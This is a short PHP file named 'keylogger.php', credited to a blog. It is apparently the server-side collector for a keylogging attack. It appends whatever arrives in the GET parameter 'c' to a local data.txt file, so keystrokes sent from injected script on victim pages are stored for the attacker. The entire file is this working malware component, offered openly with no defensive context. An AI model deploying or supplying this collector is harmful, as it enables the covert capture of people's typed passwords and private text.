<?php
/*
keylogger.php
techworld2k.blogspot.com
*/

if(!empty($_GET['c'])) {
 $logfile = fopen('data.txt', 'a+');
 fwrite($logfile, $_GET['c']);
 fclose($logfile);
}

?>